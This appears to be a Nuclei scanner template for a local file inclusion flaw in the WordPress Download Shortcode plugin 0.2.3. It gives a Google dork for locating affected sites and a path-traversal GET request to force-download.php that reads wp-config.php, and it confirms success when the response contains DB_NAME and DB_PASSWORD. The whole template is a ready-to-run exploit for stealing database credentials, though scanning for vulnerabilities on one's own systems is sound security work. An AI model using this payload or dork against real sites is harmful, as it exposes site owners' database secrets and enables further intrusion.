id: shortcode-lfi
info:
  author: dhiyaneshDK
  description: WordPress Plugin Download Shortcode is prone to a local file inclusion
    vulnerability because it fails to sufficiently sanitize user-supplied input. Exploiting
    this issue may allow an attacker to obtain sensitive information that could aid
    in further attacks. WordPress Plugin Download Shortcode version 0.2.3 is vulnerable;
    prior versions may also be affected.
  metadata:
    google-dork: inurl:wp/wp-content/force-download.php
  name: WordPress Plugin Download Shortcode Local File Inclusion (0.2.3)
  reference:
  - https://packetstormsecurity.com/files/128024/WordPress-ShortCode-1.1-Local-File-Inclusion.html
  severity: high
  tags: wordpress,wp-plugin,lfi,shortcode,wp
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - DB_NAME
    - DB_PASSWORD
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-content/force-download.php?file=../wp-config.php'
